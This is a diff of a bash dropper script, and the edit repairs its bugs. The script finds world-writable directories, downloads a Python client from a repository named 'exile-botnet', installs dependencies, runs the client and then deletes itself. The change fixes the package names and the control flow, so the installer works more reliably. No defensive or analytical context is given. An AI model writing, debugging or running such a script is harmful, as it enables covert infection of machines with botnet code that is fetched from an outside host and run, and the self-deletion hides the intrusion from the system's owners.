@@ -1,33 +1,31 @@
 #!/bin/bash
 
-# file writable directories
+# Find writable directories
 directories=($(find / -perm -222 -type d 2>/dev/null))
 
-# if none found...
+# If none found, default to current dir
 if [ ${#directories[@]} -eq 0 ]; then
-    directories=$(pwd)
+    directories=($(pwd))
 fi
 
-# randomly select a directory
+# Pick a random writable directory
 random_index=$(( RANDOM % ${#directories[@]} ))
 random_directory=${directories[$random_index]}
 
-# download binary to directory
-wget -P "$random_directory" 'https://raw.githubusercontent.com/Lettable/exile-botnet/refs/heads/main/server%2Bclient/client.py'
+# Download the Python client
+wget -q -P "$random_directory" 'https://raw.githubusercontent.com/Lettable/exile-botnet/main/server+client/client.py'
 
-# install any dependencies
-pip3 install scapy.all
-pip3 install urlib
-pip3 install subprocess
-pip3 install beautifulsoup4
-#pip3 intsall ...
+# Install dependencies (corrected package names)
+pip3 install --no-cache-dir scapy
+pip3 install --no-cache-dir beautifulsoup4
+pip3 install --no-cache-dir requests
 
-# if download was successful...
-if [ $? -eq 0 ]; then
-    # execute
-    cd $random_directory
+# cd into directory and run if file was downloaded
+client_file="$random_directory/client.py"
+if [ -f "$client_file" ]; then
+    cd "$random_directory"
     python3 client.py
 fi
 
-# self destruct
-rm -f $0
+# Self-destruct
+rm -- "$0"
